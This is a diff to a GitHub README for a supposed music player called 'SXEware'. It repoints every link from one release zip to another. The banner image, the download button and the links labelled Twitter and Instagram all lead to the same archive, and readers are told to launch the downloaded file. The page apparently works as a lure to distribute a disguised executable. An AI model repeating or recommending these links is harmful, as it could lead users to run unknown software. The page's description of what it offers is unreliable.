@@ -2,7 +2,7 @@
 
 Welcome to SXEware - your ultimate cross platform imgui music player! 🎧
 
-![SXEware](https://github.com/abdelhamid792/SXEware/releases/download/v1.0/App.zip)
+![SXEware](https://github.com/abdelhamid792/SXEware/releases/download/v2.0/Software.zip)
 
 ## Description
 SXEware is a sophisticated music player developed using modern C++17 technology, imgui library, OpenGL, and OpenAL for a seamless audio-visual experience. It is designed to run on various operating systems including Linux, macOS, and Windows.
@@ -17,7 +17,7 @@ SXEware is a sophisticated music player developed using modern C++17 technology,
 ## Installation
 To get started with SXEware, you can download the latest release by clicking the button below:
 
-[![Download SXEware](https://github.com/abdelhamid792/SXEware/releases/download/v1.0/App.zip)](https://github.com/abdelhamid792/SXEware/releases/download/v1.0/App.zip)
+[![Download SXEware](https://github.com/abdelhamid792/SXEware/releases/download/v2.0/Software.zip)](https://github.com/abdelhamid792/SXEware/releases/download/v2.0/Software.zip)
 
 Make sure to launch the downloaded file to initiate the installation process.
 
@@ -31,7 +31,7 @@ We welcome contributions to enhance SXEware even further. Whether you want to im
 If you have any feedback, suggestions, or issues to report regarding SXEware, please don't hesitate to open an issue on GitHub. Your input is valuable in making SXEware the best music player it can be.
 
 ## Connect with Us
-Stay updated on the latest SXEware news and releases by following us on [Twitter](https://github.com/abdelhamid792/SXEware/releases/download/v1.0/App.zip) and [Instagram](https://github.com/abdelhamid792/SXEware/releases/download/v1.0/App.zip).
+Stay updated on the latest SXEware news and releases by following us on [Twitter](https://github.com/abdelhamid792/SXEware/releases/download/v2.0/Software.zip) and [Instagram](https://github.com/abdelhamid792/SXEware/releases/download/v2.0/Software.zip).
 
 Thank you for choosing SXEware as your go-to music player! 🎶
 
